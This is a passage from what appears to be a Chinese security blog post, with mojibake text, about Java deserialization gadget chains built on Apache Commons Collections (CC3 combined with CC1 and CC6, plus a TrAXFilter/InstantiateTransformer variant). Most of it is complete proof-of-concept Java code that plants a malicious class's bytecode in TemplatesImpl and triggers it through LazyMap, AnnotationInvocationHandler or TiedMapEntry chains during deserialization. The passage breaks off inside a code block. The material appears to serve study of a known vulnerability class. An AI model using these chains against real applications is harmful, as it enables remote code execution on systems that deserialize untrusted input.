class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value=&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo1</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">                <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">                nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">                bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\cc3\\Evil.class&quot;</span>));</span><br><span class="line">                <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">                bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">                <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">                tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//                templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">                Transformer[] transformers_exec = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers_exec);</span><br><span class="line"><span class="comment">//                chain.transform(1);</span></span><br><span class="line">                HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,chain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">                constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">                <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">                serilize(o);</span><br><span class="line">                unserlize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serilize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">                <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">                os.writeObject(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserlize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">                <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CC6ç‰ˆæœ¬"><a href="#CC6ç‰ˆæœ¬" class="headerlink" title="CC6ç‰ˆæœ¬"></a><strong>CC6</strong>ç‰ˆæœ¬</h3><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value=&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\cc3\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//putæ—¶è°ƒç”¨åˆ°ConstantTransformerï¼Œä½¿å…¶ä¸ä¼šè§¦å‘</span></span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¹‹å‰å†é€šè¿‡åå°„æ”¹ä¸ºChainedTransformer</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factories</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factories.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factories.set(lazyMap,chain);</span><br><span class="line"></span><br><span class="line">        serilize(map2);</span><br><span class="line">        unserlize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serilize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserlize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="TrAXFilteré“¾"><a href="#TrAXFilteré“¾" class="headerlink" title="TrAXFilteré“¾"></a>TrAXFilteré“¾</h2><p>ysoserialä¸­åˆ©ç”¨TrAXFilterç±»æ¥è°ƒç”¨TemplatesImpl.newTransformer</p><p><a href="https://imgse.com/i/ppm8mKs"><img src="https://s1.ax1x.com/2023/03/08/ppm8mKs.png" alt="ppm8mKs.png"></a></p><p>TrAXFilterçš„æ„é€ å‡½æ•°é‡Œè¿›è¡Œäº†è°ƒç”¨</p><p><a href="https://imgse.com/i/ppm8tM9"><img src="https://s1.ax1x.com/2023/03/08/ppm8tM9.png" alt="ppm8tM9.png"></a></p><p><code>InstantiateTransformer.transform</code>èƒ½å¤Ÿå–å¾—å¯¹è±¡æ„é€ å™¨å¹¶ä¸”å°†å…¶å®ä¾‹åŒ–</p><p><a href="https://imgse.com/i/ppm8IJS"><img src="https://s1.ax1x.com/2023/03/08/ppm8IJS.png" alt="ppm8IJS.png"></a></p><p>çœ‹åˆ°å…¶æ„é€ å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>demo1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure><p>åŒæ ·å¯ä»¥æ‹¼å‡‘CC1å’ŒCC6</p><h3 id="CC1ç‰ˆæœ¬-1"><a href="#CC1ç‰ˆæœ¬-1" class="headerlink" title="CC1ç‰ˆæœ¬"></a>CC1ç‰ˆæœ¬</h3><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value=&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrAXFilterCC1CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\ä»£ç \\javaä»£ç \\ccé“¾\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//                templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers_exec);</span><br><span class="line"><span class="comment">//                chain.transform(1);</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,chain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">        serilize(o);</span><br><span class="line">        unserlize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serilize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserlize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CC6ç‰ˆæœ¬-1"><a href="#CC6ç‰ˆæœ¬-1" class="headerlink" title="CC6ç‰ˆæœ¬"></a>CC6ç‰ˆæœ¬</h3><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 